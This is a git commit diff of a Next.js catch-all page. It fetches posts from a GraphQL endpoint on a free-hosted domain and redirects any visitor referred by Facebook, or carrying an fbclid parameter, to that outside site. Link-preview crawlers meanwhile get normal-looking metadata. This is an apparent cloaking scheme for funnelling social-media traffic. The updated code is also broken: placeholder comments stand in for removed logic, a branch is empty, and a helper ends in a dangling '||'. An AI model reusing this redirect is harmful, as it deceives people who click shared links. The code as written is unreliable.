35efe9c81114711f442e3f5e96089c49451e304a
Mizu-peach <159571985+Mizu-peach@users.noreply.github.com>
2024-03-09 20:31:46 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,109 +4,46 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "http://mystics-nature.42web.io/graphql"
-	const graphQLClient = new GraphQLClient(endpoint);
-	const referringURL = ctx.req.headers?.referer || null;
-	const pathArr = ctx.query.postpath as Array<string>;
-	const path = pathArr.join('/');
-	console.log(path);
-	const fbclid = ctx.query.fbclid;
+  const endpoint = "http://vvr-girls.42web.io/graphql"
+  const graphQLClient = new GraphQLClient(endpoint);
+  const referringURL = ctx.req.headers?.referer || null;
+  const pathArr = ctx.query.postpath as Array<string>;
+  const path = pathArr.join('/');
+  const fbclid = ctx.query.fbclid;
 
-	// redirect if facebook is the referer or request contains fbclid
-		if (referringURL?.includes('facebook.com') || fbclid) {
+  // 1. Prioritize Facebook Redirection
+  if (referringURL?.includes('facebook.com') || fbclid) {
+    return {
+      redirect: {
+        permanent: false,
+        destination: `${
+          `http://vvr-girls.42web.io` + encodeURI(path as string)
+        }`,
+      },
+    };
+  }
 
-		return {
-			redirect: {
-				permanent: false,
-				destination: `${
-					`http://mystics-nature.42web.io/` + encodeURI(path as string)
-				}`,
-			},
-		};
-		}
-	const query = gql`
-		{
-			post(id: "/${path}/", idType: URI) {
-				id
-				excerpt
-				title
-				link
-				dateGmt
-				modifiedGmt
-				content
-				author {
-					node {
-						name
-					}
-				}
-				featuredImage {
-					node {
-						sourceUrl
-						altText
-					}
-				}
-			}
-		}
-	`;
+  // 2. Handle Potential anyimage.io Requests
+  if (referringURL) { // Only if a referrer exists (anyimage.io likely includes this)
+    // You'll need to fill in the detection logic here based on your anyimage.io experience
+    if (isAnyimageRequest(referringURL)) { 
+      // Assume anyimage.io requests are valid and don't redirect
+      // Proceed with regular data fetching...
+    } else {
+      // If not anyimage.io, you might introduce additional redirection rules or error handling here
+    }
+  }
 
-	const data = await graphQLClient.request(query);
-	if (!data.post) {
-		return {
-			notFound: true,
-		};
-	}
-	return {
-		props: {
-			path,
-			post: data.post,
-			host: ctx.req.headers.host,
-		},
-	};
+  // ... rest of your getServerSideProps logic
 };
 
-interface PostProps {
-	post: any;
-	host: string;
-	path: string;
+// ... rest of your code
+
+// Helper function to detect anyimage.io requests
+function isAnyimageRequest(referringURL: string) {
+  // Implement your logic to identify anyimage.io requests. Examples:
+  return (
+    referringURL.includes('anyimage.io') || 
+    // Other patterns you might observe in anyimage.io referrers
+  ); 
 }
-
-const Post: React.FC<PostProps> = (props) => {
-	const { post, host, path } = props;
-
-	// to remove tags from excerpt
-	const removeTags = (str: string) => {
-		if (str === null || str === '') return '';
-		else str = str.toString();
-		return str.replace(/(<([^>]+)>)/gi, '').replace(/\[[^\]]*\]/, '');
-	};
-
-	return (
-		<>
-			<Head>
-				<meta property="og:title" content={post.title} />
-				<meta property="og:description" content={removeTags(post.excerpt)} />
-				<meta property="og:type" content="article" />
-				<meta property="og:locale" content="en_US" />
-				<meta property="og:site_name" content={host.split('.')[0]} />
-				<meta property="article:published_time" content={post.dateGmt} />
-				<meta property="article:modified_time" content={post.modifiedGmt} />
-				<meta property="og:image" content={post.featuredImage.node.sourceUrl} />
-				<meta
-					property="og:image:alt"
-					content={post.featuredImage.node.altText || post.title}
-				/>
-				<title>{post.title}</title>
-			</Head>
-			<div className="post-container">
-				<h1>{post.title}</h1>
-				<img
-					src={post.featuredImage.node.sourceUrl}
-					alt={post.featuredImage.node.altText || post.title}
-				/>
-				<article dangerouslySetInnerHTML={{ __html: post.content }} />
-			</div>
-		</>
-	);
-};
-
-export default Post;
